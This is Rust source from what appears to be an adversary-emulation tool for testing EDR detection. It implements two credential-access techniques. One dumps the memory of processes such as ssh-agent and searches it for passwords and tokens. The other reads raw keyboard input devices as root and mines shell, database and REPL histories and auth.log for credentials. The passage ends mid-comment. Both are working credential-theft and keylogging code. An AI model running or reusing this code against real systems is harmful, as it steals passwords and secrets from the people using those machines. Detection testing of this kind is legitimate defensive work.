use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{ExecuteFuture, CleanupFuture};
use async_trait::async_trait;
use log::{info, warn};
use regex::Regex;
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tokio::io::AsyncWriteExt;
use tokio::process::Command;
use tokio::time::{sleep, Duration};
use uuid::Uuid;

pub struct MemoryDumping {}

#[async_trait]
impl AttackTechnique for MemoryDumping {
    fn info(&self) -> Technique {
        Technique {
            id: "T1003.001".to_string(),
            name: "Memory Dumping".to_string(),
            description: "Performs REAL memory dumping of running processes using gcore or /proc/[pid]/mem to extract credential patterns. Requires appropriate privileges and generates detectable telemetry.".to_string(),
            category: "credential_access".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "target_pid".to_string(),
                    description: "PID of process to dump memory from (0 = auto-enumerate targets: ssh-agent, systemd, or first available)".to_string(),
                    required: false,
                    default: Some("0".to_string()),
                },
                TechniqueParameter {
                    name: "dump_file".to_string(),
                    description: "Path to save memory dump file".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_memory_dump".to_string()),
                },
            ],
            detection: "Monitor for gcore execution, /proc/[pid]/mem access, process memory dumping utilities, suspicious memory access patterns, and credential extraction behaviour".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root or process owner".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let target_pid_str = config
                .parameters
                .get("target_pid")
                .unwrap_or(&"0".to_string())
                .clone();
                
            let dump_file = config
                .parameters
                .get("dump_file")
                .unwrap_or(&"/tmp/signalbench_memory_dump".to_string())
                .clone();
            
            // Determine target PID
            let (target_pid, process_name) = if target_pid_str == "0" {
                // Auto-enumerate: prioritise ssh-agent, then systemd, then first available process
                info!("Auto-enumerating target processes...");
                
                let priority_targets = vec!["ssh-agent", "systemd", "pid1", "bash"];
                let mut selected_pid = 0u32;
                let mut selected_name = String::new();
                
                // Try to find priority targets
                if let Ok(proc_entries) = fs::read_dir("/proc") {
                    for entry in proc_entries.flatten() {
                        if let Ok(file_name) = entry.file_name().into_string() {
                            if let Ok(pid) = file_name.parse::<u32>() {
                                let comm_path = format!("/proc/{pid}/comm");
                                if let Ok(comm_content) = fs::read_to_string(&comm_path) {
                                    let proc_name = comm_content.trim().to_string();
                                    
                                    for target in &priority_targets {
                                        if proc_name.contains(target) {
                                            selected_pid = pid;
                                            selected_name = proc_name.clone();
                                            info!("Found priority target: {selected_name} (PID: {selected_pid})");
                                            break;
                                        }
                                    }
                                    
                                    if selected_pid != 0 {
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
                
                // Fallback to self if no target found
                if selected_pid == 0 {
                    selected_pid = std::process::id();
                    selected_name = "signalbench".to_string();
                    info!("No priority targets found, using self (PID: {selected_pid})");
                }
                
                (selected_pid, selected_name)
            } else {
                let pid = target_pid_str.parse::<u32>()
                    .map_err(|e| format!("Invalid PID: {e}"))?;
                
                let comm_path = format!("/proc/{pid}/comm");
                let proc_name = fs::read_to_string(&comm_path)
                    .unwrap_or_else(|_| "unknown".to_string())
                    .trim()
                    .to_string();
                
                (pid, proc_name)
            };
            
            if dry_run {
                info!("[DRY RUN] Would dump REAL memory from process: {process_name} (PID: {target_pid})");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would dump REAL memory from {process_name} (PID: {target_pid})"),
                    artifacts: vec![dump_file],
                    cleanup_required: false,
                });
            }

            info!("Starting REAL memory dump of process: {process_name} (PID: {target_pid})");
            
            // Try gcore first (if available), then fallback to /proc/[pid]/mem
            let gcore_available = Command::new("which")
                .arg("gcore")
                .output()
                .await
                .map(|output| output.status.success())
                .unwrap_or(false);
            
            let mut dump_successful = false;
            let mut dump_size = 0u64;
            
            if gcore_available {
                info!("Using gcore to dump process memory...");
                
                // Create temporary directory for gcore output
                let temp_dir = format!("/tmp/signalbench_gcore_{target_pid}");
                let _ = fs::create_dir_all(&temp_dir);
                
                let gcore_output = Command::new("gcore")
                    .arg("-o")
                    .arg(format!("{temp_dir}/core"))
                    .arg(target_pid.to_string())
                    .output()
                    .await;
                
                match gcore_output {
                    Ok(output) => {
                        if output.status.success() {
                            // Find generated core file
                            if let Ok(entries) = fs::read_dir(&temp_dir) {
                                for entry in entries.flatten() {
                                    let path = entry.path();
                                    if path.file_name().unwrap_or_default().to_string_lossy().starts_with("core") {
                                        // Move core file to dump_file location
                                        if fs::rename(&path, &dump_file).is_ok() {
                                            dump_successful = true;
                                            dump_size = fs::metadata(&dump_file)
                                                .map(|m| m.len())
                                                .unwrap_or(0);
                                            info!("gcore dump successful: {dump_size} bytes");
                                        }
                                        break;
                                    }
                                }
                            }
                        } else {
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            warn!("gcore failed: {stderr}, falling back to /proc/[pid]/mem");
                        }
                    }
                    Err(e) => {
                        warn!("gcore execution failed: {e}, falling back to /proc/[pid]/mem");
                    }
                }
                
                // Cleanup temp directory
                let _ = fs::remove_dir_all(&temp_dir);
            }
            
            // Fallback to /proc/[pid]/mem if gcore failed or unavailable
            if !dump_successful {
                info!("Using /proc/[pid]/mem to dump process memory...");
                
                let mem_path = format!("/proc/{target_pid}/mem");
                let maps_path = format!("/proc/{target_pid}/maps");
                
                // Read memory maps to find readable regions
                let maps_content = fs::read_to_string(&maps_path)
                    .map_err(|e| format!("Failed to read memory maps: {e} (insufficient permissions?)"))?;
                
                let mut dump_file_handle = File::create(&dump_file)
                    .map_err(|e| format!("Failed to create dump file: {e}"))?;
                
                // Extract memory from readable regions
                let readable_regions: Vec<_> = maps_content
                    .lines()
                    .filter(|line| line.contains(" r"))
                    .take(10) // Limit to first 10 regions to avoid huge dumps
                    .collect();
                
                info!("Found {} readable memory regions", readable_regions.len());
                
                for (idx, region) in readable_regions.iter().enumerate() {
                    if let Some(addr_range) = region.split_whitespace().next() {
                        if let Some((start_str, end_str)) = addr_range.split_once('-') {
                            if let (Ok(start), Ok(end)) = (
                                u64::from_str_radix(start_str, 16),
                                u64::from_str_radix(end_str, 16)
                            ) {
                                let size = (end - start).min(1024 * 1024); // Max 1MB per region
                                
                                // Use dd to extract memory region
                                let dd_output = Command::new("dd")
                                    .arg(format!("if={mem_path}"))
                                    .arg(format!("of=/tmp/signalbench_mem_region_{idx}"))
                                    .arg("bs=1")
                                    .arg(format!("count={size}"))
                                    .arg(format!("skip={start}"))
                                    .arg("conv=noerror,sync")
                                    .stderr(std::process::Stdio::null())
                                    .output()
                                    .await;
                                
                                if dd_output.is_ok() {
                                    let region_file = format!("/tmp/signalbench_mem_region_{idx}");
                                    if let Ok(region_data) = fs::read(&region_file) {
                                        dump_file_handle.write_all(&region_data)
                                            .map_err(|e| format!("Failed to write memory region: {e}"))?;
                                        dump_size += region_data.len() as u64;
                                    }
                                    let _ = fs::remove_file(&region_file);
                                }
                            }
                        }
                    }
                }
                
                if dump_size > 0 {
                    dump_successful = true;
                    info!("/proc/[pid]/mem dump successful: {dump_size} bytes");
                } else {
                    return Err("Failed to dump any memory (insufficient permissions?)".to_string());
                }
            }
            
            if !dump_successful {
                return Err("Memory dump failed using all available methods".to_string());
            }
            
            // Parse memory dump for credential patterns
            info!("Parsing memory dump for credential patterns...");
            
            let credential_patterns = vec![
                "password", "passwd", "pwd",
                "token", "auth", "key", "secret",
                "credential", "cred", "api_key",
                "authorization", "bearer",
            ];
            
            // Use strings command to extract readable strings from dump
            let strings_output = Command::new("strings")
                .arg(&dump_file)
                .output()
                .await
                .map_err(|e| format!("Failed to run strings: {e}"))?;
            
            let strings_content = String::from_utf8_lossy(&strings_output.stdout);
            let mut found_patterns = Vec::new();
            
            for line in strings_content.lines() {
                let line_lower = line.to_lowercase();
                for pattern in &credential_patterns {
                    if line_lower.contains(pattern) && line.len() > 5 && line.len() < 200 {
                        found_patterns.push(format!("{}: {}", pattern, line.chars().take(80).collect::<String>()));
                        if found_patterns.len() >= 20 {
                            break;
                        }
                    }
                }
                if found_patterns.len() >= 20 {
                    break;
                }
            }
            
            // Create analysis log
            let analysis_file = format!("{dump_file}.analysis");
            let mut analysis_handle = File::create(&analysis_file)
                .map_err(|e| format!("Failed to create analysis file: {e}"))?;
            
            writeln!(analysis_handle, "=== SignalBench REAL Memory Dump Analysis ===").unwrap();
            writeln!(analysis_handle, "Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(analysis_handle,"Target PID: {target_pid}").unwrap();
            writeln!(analysis_handle,"Process Name: {process_name}").unwrap();
            writeln!(analysis_handle, "Memory Dump Size: {} bytes ({:.2} MB)", dump_size, dump_size as f64 / 1024.0 / 1024.0).unwrap();
            writeln!(analysis_handle,"Dump File: {dump_file}").unwrap();
            writeln!(analysis_handle, "\n=== Credential Patterns Found: {} ===", found_patterns.len()).unwrap();
            
            for (idx, pattern) in found_patterns.iter().enumerate() {
                writeln!(analysis_handle, "{}. {}", idx + 1, pattern).unwrap();
            }
            
            writeln!(analysis_handle, "\n=== WARNING ===").unwrap();
            writeln!(analysis_handle, "This is a REAL memory dump that may contain sensitive data.").unwrap();
            writeln!(analysis_handle, "Ensure proper cleanup and secure handling.").unwrap();
            
            info!("Memory dump analysis complete:");
            info!("  - Target: {process_name} (PID: {target_pid})");
            info!("  - Dump size: {} bytes ({:.2} MB)", dump_size, dump_size as f64 / 1024.0 / 1024.0);
            info!("  - Credential patterns found: {}", found_patterns.len());
            info!("  - Analysis saved to: {analysis_file}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "REAL memory dump complete: {} (PID: {}) - {} bytes dumped, {} credential patterns found",
                    process_name, target_pid, dump_size, found_patterns.len()
                ),
                artifacts: vec![dump_file, analysis_file],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed artifact: {artifact}"),
                        Err(e) => warn!("Failed to remove artifact {artifact}: {e}"),
                    }
                }
            }
            
            // Also cleanup any temporary gcore directories
            if let Ok(entries) = fs::read_dir("/tmp") {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if let Some(name) = path.file_name() {
                        if name.to_string_lossy().starts_with("signalbench_gcore_") {
                            let _ = fs::remove_dir_all(&path);
                            info!("Removed temporary gcore directory: {}", path.display());
                        }
                    }
                }
            }
            
            Ok(())
        })
    }
}

pub struct KeyloggerSimulation {}

#[async_trait]
impl AttackTechnique for KeyloggerSimulation {
    fn info(&self) -> Technique {
        Technique {
            id: "T1056.001".to_string(),
            name: "Keylogging".to_string(),
            description: "Performs exhaustive keystroke capture attempts from ALL /dev/input/event0-15 devices when running as root (5s per device), AND comprehensive historical keystroke analysis from bash_history, lesshst, auth.log, mysql_history, psql_history, sqlite_history, redis_history, and node_repl_history. Extracts credentials, authentication attempts, usernames, and sudo usage patterns. Designed to generate maximum EDR/XDR detection telemetry.".to_string(),
            category: "credential_access".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save keylogger output".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_keylogger.log".to_string()),
                },
                TechniqueParameter {
                    name: "capture_duration".to_string(),
                    description: "Duration to capture from EACH /dev/input device (seconds) when running as root".to_string(),
                    required: false,
                    default: Some("5".to_string()),
                },
            ],
            detection: "Monitor for enumeration of ALL /dev/input/event* devices (event0-15), sequential read attempts with permission denied errors, excessive access to bash_history, lesshst, auth.log, mysql_history, psql_history, sqlite_history, redis_history, node_repl_history, and suspicious credential pattern extraction. This technique generates HIGH-VOLUME file access telemetry.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user (historical analysis) or root (real device capture)".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_keylogger.log".to_string())
                .clone();
                
            let capture_duration_str = config
                .parameters
                .get("capture_duration")
                .unwrap_or(&"5".to_string())
                .clone();
                
            let capture_duration = capture_duration_str.parse::<u64>().unwrap_or(5);
            
            // Check if running as root
            let is_root = unsafe { libc::geteuid() } == 0;
            
            if dry_run {
                if is_root {
                    info!("[DRY RUN] Would attempt REAL keystroke capture from /dev/input/event* for {capture_duration} seconds");
                } else {
                    info!("[DRY RUN] Would perform historical keystroke analysis (not root)");
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would perform {} keystroke capture", if is_root { "REAL device" } else { "historical" }),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            // Create keylogger log file
            let mut file = File::create(&log_file)
                .map_err(|e| format!("Failed to create keylogger log file: {e}"))?;
            
            // Write header
            writeln!(file, "=== SignalBench Keylogger ===").unwrap();
            writeln!(file, "Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(file,"Running as root: {is_root}").unwrap();
            writeln!(file).unwrap();
            
            let mut capture_method = String::new();
            let mut events_captured = 0;
            let mut potential_credentials = Vec::new();
            let mut artifacts = vec![log_file.clone()];
            
            // Attempt REAL device capture if root
            if is_root {
                info!("Running as root - attempting keystroke capture from ALL /dev/input/event0-15 devices");
                writeln!(file, "## REAL Device Keystroke Capture").unwrap();
                writeln!(file,"Capture duration: {capture_duration} seconds PER DEVICE").unwrap();
                writeln!(file).unwrap();
                
                // Try ALL event0-15 devices explicitly
                writeln!(file, "### Enumerating /dev/input/event0-15 devices").unwrap();
                info!("Enumerating /dev/input/event0-15...");
                
                let mut accessible_devices = Vec::new();
                let mut permission_denied_devices = Vec::new();
                let mut nonexistent_devices = Vec::new();
                
                // Try each device from event0 to event15
                for event_num in 0..=15 {
                    let device_path = format!("/dev/input/event{event_num}");
                    let path = Path::new(&device_path);
                    
                    if path.exists() {
                        // Test read access
                        match fs::File::open(path) {
                            Ok(_) => {
                                accessible_devices.push(device_path.clone());
                                writeln!(file, "  [ACCESSIBLE] {device_path}").unwrap();
                                info!("  [ACCESSIBLE] {device_path}");
                            }
                            Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
                                permission_denied_devices.push(device_path.clone());
                                writeln!(file, "  [PERMISSION DENIED] {device_path}").unwrap();
                                warn!("  [PERMISSION DENIED] {device_path}");
                            }
                            Err(e) => {
                                writeln!(file, "  [ERROR] {device_path}: {e}").unwrap();
                                warn!("  [ERROR] {device_path}: {e}");
                            }
                        }
                    } else {
                        nonexistent_devices.push(device_path.clone());
                    }
                }
                
                writeln!(file).unwrap();
                writeln!(file, "Device enumeration summary:").unwrap();
                writeln!(file, "  - Accessible: {}", accessible_devices.len()).unwrap();
                writeln!(file, "  - Permission denied: {}", permission_denied_devices.len()).unwrap();
                writeln!(file, "  - Non-existent: {}", nonexistent_devices.len()).unwrap();
                writeln!(file).unwrap();
                
                info!("Device enumeration: {} accessible, {} denied, {} non-existent", 
                    accessible_devices.len(), permission_denied_devices.len(), nonexistent_devices.len());
                
                // Attempt to read from EACH accessible device
                if !accessible_devices.is_empty() {
                    writeln!(file, "### Attempting capture from {} accessible devices", accessible_devices.len()).unwrap();
                    writeln!(file).unwrap();
                    
                    let mut total_bytes_captured = 0u64;
                    let mut successful_captures = 0;
                    
                    for (idx, device_path) in accessible_devices.iter().enumerate() {
                        writeln!(file, "#### Device {}/{}: {}", idx + 1, accessible_devices.len(), device_path).unwrap();
                        info!("Attempting capture from device {}/{}: {}", idx + 1, accessible_devices.len(), device_path);
                        
                        // Create unique temp file for this device
                        let temp_capture_file = format!("/tmp/signalbench_keylog_event{idx}.raw");
                        
                        // Use dd to attempt raw device read (generates telemetry)
                        let dd_result = Command::new("dd")
                            .arg(format!("if={device_path}"))
                            .arg(format!("of={temp_capture_file}"))
                            .arg("bs=1")
                            .arg(format!("count={}", capture_duration * 1000)) // Increased from 100 to 1000
                            .arg("iflag=nonblock")
                            .stderr(std::process::Stdio::null())
                            .stdout(std::process::Stdio::null())
                            .spawn();
                        
                        match dd_result {
                            Ok(mut child) => {
                                // Let it run for capture_duration
                                sleep(Duration::from_secs(capture_duration)).await;
                                
                                // Kill the dd process
                                let _ = child.kill().await;
                                
                                // Check if we captured anything
                                if let Ok(metadata) = fs::metadata(&temp_capture_file) {
                                    let bytes_captured = metadata.len();
                                    if bytes_captured > 0 {
                                        writeln!(file,"  Raw bytes captured: {bytes_captured}").unwrap();
                                        info!("  Captured {bytes_captured} raw bytes from {device_path}");
                                        
                                        total_bytes_captured += bytes_captured;
                                        successful_captures += 1;
                                        
                                        artifacts.push(temp_capture_file.clone());
                                    } else {
                                        writeln!(file, "  No data captured (no keyboard events during capture window)").unwrap();
                                        let _ = fs::remove_file(&temp_capture_file);
                                    }
                                } else {
                                    writeln!(file, "  Failed to capture data").unwrap();
                                }
                            }
                            Err(e) => {
                                writeln!(file,"  Failed to start device capture: {e}").unwrap();
                                warn!("  Failed to start dd for {device_path}: {e}");
                            }
                        }
                        writeln!(file).unwrap();
                    }
                    
                    events_captured = total_bytes_captured as usize;
                    if successful_captures > 0 {
                        capture_method = format!("Device capture from {} devices ({} successful)", 
                            accessible_devices.len(), successful_captures);
                        
                        writeln!(file, "REAL device capture summary:").unwrap();
                        writeln!(file, "  - Total bytes captured: {total_bytes_captured}").unwrap();
                        writeln!(file, "  - Successful captures: {successful_captures}/{}", accessible_devices.len()).unwrap();
                        writeln!(file, "Note: Raw evdev data captured (not decoded for simulation purposes)").unwrap();
                        writeln!(file).unwrap();
                    }
                } else {
                    writeln!(file, "No accessible /dev/input/event* devices found").unwrap();
                    warn!("No accessible input devices found");
                }
            }
            
            // Fallback to historical keystroke analysis (or in addition if real capture failed)
            if !is_root || events_captured == 0 {
                if !is_root {
                    info!("Not running as root - performing historical keystroke analysis");
                } else {
                    info!("Real device capture unsuccessful - falling back to historical analysis");
                }
                
                writeln!(file, "## Historical Keystroke Analysis").unwrap();
                writeln!(file).unwrap();
                
                capture_method = "Historical keystroke analysis".to_string();
                
                // Get home directory
                let home_dir = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
                
                // Parse ~/.bash_history
                let bash_history = format!("{home_dir}/.bash_history");
                if Path::new(&bash_history).exists() {
                    writeln!(file, "### Analysing ~/.bash_history").unwrap();
                    if let Ok(content) = fs::read_to_string(&bash_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total commands: {}", lines.len()).unwrap();
                        
                        // Extract potential credentials from commands
                        for line in lines.iter().rev().take(50) {
                            let line_lower = line.to_lowercase();
                            
                            // Look for password patterns in commands
                            if line_lower.contains("password") || line_lower.contains("passwd") 
                                || line_lower.contains("-p ") || line_lower.contains("--password")
                                || line_lower.contains("mysql") || line_lower.contains("psql")
                                || line_lower.contains("ssh") || line_lower.contains("scp") {
                                potential_credentials.push(format!("bash_history: {line}"));
                                writeln!(file,"  Credential pattern: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.lesshst
                let lesshst = format!("{home_dir}/.lesshst");
                if Path::new(&lesshst).exists() {
                    writeln!(file, "### Analysing ~/.lesshst").unwrap();
                    if let Ok(content) = fs::read_to_string(&lesshst) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total less history entries: {}", lines.len()).unwrap();
                        
                        // Extract search patterns that might reveal credential files
                        for line in lines.iter().rev().take(20) {
                            if line.contains("password") || line.contains("secret") 
                                || line.contains("key") || line.contains("token") {
                                potential_credentials.push(format!("lesshst: {line}"));
                                writeln!(file,"  Search pattern: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse /var/log/auth.log (if accessible) - ENHANCED v1.5.13
                let auth_log = "/var/log/auth.log";
                if Path::new(auth_log).exists() {
                    writeln!(file, "### Analysing /var/log/auth.log (ENHANCED)").unwrap();
                    if let Ok(content) = fs::read_to_string(auth_log) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total auth log entries: {}", lines.len()).unwrap();
                        
                        // Enhanced pattern tracking
                        let mut failed_passwords = 0;
                        let mut accepted_passwords = 0;
                        let mut sudo_commands = 0;
                        let mut usernames = std::collections::HashSet::new();
                        let mut auth_methods = std::collections::HashSet::new();
                        
                        // Extract authentication attempts, sudo commands, and user patterns
                        for line in lines.iter().rev().take(200) {
                            // Failed password attempts
                            if line.contains("Failed password") {
                                failed_passwords += 1;
                                potential_credentials.push(format!("auth.log: {line}"));
                                writeln!(file, "  [FAILED AUTH] {}", line.chars().take(150).collect::<String>()).unwrap();
                                
                                // Extract username from failed password line
                                if let Some(user_start) = line.find("for ") {
                                    if let Some(username) = line[user_start + 4..].split_whitespace().next() {
                                        usernames.insert(username.to_string());
                                    }
                                }
                            }
                            
                            // Accepted password attempts
                            if line.contains("Accepted password") || line.contains("Accepted publickey") {
                                accepted_passwords += 1;
                                potential_credentials.push(format!("auth.log: {line}"));
                                writeln!(file, "  [SUCCESSFUL AUTH] {}", line.chars().take(150).collect::<String>()).unwrap();
                                
                                // Identify auth method
                                if line.contains("publickey") {
                                    auth_methods.insert("publickey".to_string());
                                } else if line.contains("password") {
                                    auth_methods.insert("password".to_string());
                                }
                                
                                // Extract username
                                if let Some(user_start) = line.find("for ") {
                                    if let Some(username) = line[user_start + 4..].split_whitespace().next() {
                                        usernames.insert(username.to_string());
                                    }
                                }
                            }
                            
                            // Sudo commands
                            if line.contains("sudo:") && line.contains("COMMAND=") {
                                sudo_commands += 1;
                                potential_credentials.push(format!("auth.log: {line}"));
                                writeln!(file, "  [SUDO] {}", line.chars().take(150).collect::<String>()).unwrap();
                                
                                // Extract sudo user
                                if let Some(user_start) = line.find("USER=") {
                                    if let Some(username) = line[user_start + 5..].split_whitespace().next() {
                                        usernames.insert(username.to_string());
                                    }
                                }
                            }
                            
                            // PAM authentication events
                            if line.contains("pam_unix") && line.contains("authentication failure") {
                                writeln!(file, "  [PAM FAILURE] {}", line.chars().take(150).collect::<String>()).unwrap();
                            }
                        }
                        
                        // Write enhanced summary
                        writeln!(file).unwrap();
                        writeln!(file, "  Authentication Pattern Summary:").unwrap();
                        writeln!(file, "    - Failed password attempts: {failed_passwords}").unwrap();
                        writeln!(file, "    - Successful authentications: {accepted_passwords}").unwrap();
                        writeln!(file, "    - Sudo commands executed: {sudo_commands}").unwrap();
                        writeln!(file, "    - Unique usernames detected: {}", usernames.len()).unwrap();
                        if !usernames.is_empty() {
                            writeln!(file, "    - Usernames: {}", usernames.iter().take(10).cloned().collect::<Vec<_>>().join(", ")).unwrap();
                        }
                        if !auth_methods.is_empty() {
                            writeln!(file, "    - Auth methods used: {}", auth_methods.iter().cloned().collect::<Vec<_>>().join(", ")).unwrap();
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.mysql_history
                let mysql_history = format!("{home_dir}/.mysql_history");
                if Path::new(&mysql_history).exists() {
                    writeln!(file, "### Analysing ~/.mysql_history").unwrap();
                    if let Ok(content) = fs::read_to_string(&mysql_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total MySQL commands: {}", lines.len()).unwrap();
                        
                        // Extract SQL commands that might contain credentials
                        for line in lines.iter().rev().take(30) {
                            let line_lower = line.to_lowercase();
                            if line_lower.contains("password") || line_lower.contains("grant") 
                                || line_lower.contains("create user") || line_lower.contains("identified by") {
                                potential_credentials.push(format!("mysql_history: {line}"));
                                writeln!(file,"  SQL command: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.psql_history
                let psql_history = format!("{home_dir}/.psql_history");
                if Path::new(&psql_history).exists() {
                    writeln!(file, "### Analysing ~/.psql_history").unwrap();
                    if let Ok(content) = fs::read_to_string(&psql_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total PostgreSQL commands: {}", lines.len()).unwrap();
                        
                        // Extract SQL commands that might contain credentials
                        for line in lines.iter().rev().take(30) {
                            let line_lower = line.to_lowercase();
                            if line_lower.contains("password") || line_lower.contains("grant") 
                                || line_lower.contains("create user") || line_lower.contains("role") {
                                potential_credentials.push(format!("psql_history: {line}"));
                                writeln!(file,"  SQL command: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.sqlite_history - NEW v1.5.13
                let sqlite_history = format!("{home_dir}/.sqlite_history");
                if Path::new(&sqlite_history).exists() {
                    writeln!(file, "### Analysing ~/.sqlite_history (NEW v1.5.13)").unwrap();
                    if let Ok(content) = fs::read_to_string(&sqlite_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total SQLite commands: {}", lines.len()).unwrap();
                        
                        // Extract SQL commands that might contain credentials or sensitive data
                        for line in lines.iter().rev().take(30) {
                            let line_lower = line.to_lowercase();
                            if line_lower.contains("password") || line_lower.contains("secret") 
                                || line_lower.contains("token") || line_lower.contains("key")
                                || line_lower.contains("insert into") || line_lower.contains("update") {
                                potential_credentials.push(format!("sqlite_history: {line}"));
                                writeln!(file,"  SQLite command: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.redis_history - NEW v1.5.13
                let redis_history = format!("{home_dir}/.redis_history");
                if Path::new(&redis_history).exists() {
                    writeln!(file, "### Analysing ~/.redis_history (NEW v1.5.13)").unwrap();
                    if let Ok(content) = fs::read_to_string(&redis_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total Redis commands: {}", lines.len()).unwrap();
                        
                        // Extract Redis commands that might reveal sensitive data
                        for line in lines.iter().rev().take(30) {
                            let line_upper = line.to_uppercase();
                            // Redis commands often store tokens, sessions, credentials
                            if line_upper.contains("SET") || line_upper.contains("GET") 
                                || line_upper.contains("AUTH") || line_upper.contains("CONFIG")
                                || line.to_lowercase().contains("password") 
                                || line.to_lowercase().contains("token")
                                || line.to_lowercase().contains("session") {
                                potential_credentials.push(format!("redis_history: {line}"));
                                writeln!(file,"  Redis command: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.rediscli_history as alternative - NEW v1.5.13
                let rediscli_history = format!("{home_dir}/.rediscli_history");
                if Path::new(&rediscli_history).exists() {
                    writeln!(file, "### Analysing ~/.rediscli_history (NEW v1.5.13)").unwrap();
                    if let Ok(content) = fs::read_to_string(&rediscli_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total Redis CLI commands: {}", lines.len()).unwrap();
                        
                        for line in lines.iter().rev().take(30) {
                            let line_upper = line.to_uppercase();
                            if line_upper.contains("SET") || line_upper.contains("GET") 
                                || line_upper.contains("AUTH") || line_upper.contains("CONFIG") {
                                potential_credentials.push(format!("rediscli_history: {line}"));
                                writeln!(file,"  Redis CLI command: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.node_repl_history - NEW v1.5.13
                let node_repl_history = format!("{home_dir}/.node_repl_history");
                if Path::new(&node_repl_history).exists() {
                    writeln!(file, "### Analysing ~/.node_repl_history (NEW v1.5.13)").unwrap();
                    if let Ok(content) = fs::read_to_string(&node_repl_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total Node.js REPL commands: {}", lines.len()).unwrap();
                        
                        // Extract JavaScript/Node.js commands that might contain credentials
                        for line in lines.iter().rev().take(40) {
                            let line_lower = line.to_lowercase();
                            if line_lower.contains("password") || line_lower.contains("secret") 
                                || line_lower.contains("token") || line_lower.contains("api")
                                || line_lower.contains("key") || line_lower.contains("auth")
                                || line_lower.contains("process.env") 
                                || line_lower.contains("require(") {
                                potential_credentials.push(format!("node_repl_history: {line}"));
                                writeln!(file,"  Node.js command: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
                
                // Parse ~/.python_history - NEW v1.5.13
                let python_history = format!("{home_dir}/.python_history");
                if Path::new(&python_history).exists() {
                    writeln!(file, "### Analysing ~/.python_history (NEW v1.5.13)").unwrap();
                    if let Ok(content) = fs::read_to_string(&python_history) {
                        let lines: Vec<&str> = content.lines().collect();
                        events_captured += lines.len();
                        
                        writeln!(file, "Total Python REPL commands: {}", lines.len()).unwrap();
                        
                        // Extract Python commands that might contain credentials
                        for line in lines.iter().rev().take(40) {
                            let line_lower = line.to_lowercase();
                            if line_lower.contains("password") || line_lower.contains("secret") 
                                || line_lower.contains("token") || line_lower.contains("api")
                                || line_lower.contains("key") || line_lower.contains("auth")
                                || line_lower.contains("os.environ") 
                                || line_lower.contains("import") {
                                potential_credentials.push(format!("python_history: {line}"));
                                writeln!(file,"  Python command: {line}").unwrap();
                            }
                        }
                    }
                    writeln!(file).unwrap();
                }
            }
            
            // TODO: Optional inotify monitoring (requires adding `inotify` crate dependency)
            // This would provide real-time monitoring of keyboard device events.
            // Implementation notes for future enhancement:
            // 1. Add `inotify = "0.10"` to Cargo.toml dependencies
            // 2. Use inotify to watch /dev/input/event* devices for IN_ACCESS events
            // 3. Monitor for 5-10 seconds and log any keyboard activity
            // 4. This would generate additional XDR telemetry for file descriptor monitoring
            // Example code structure:
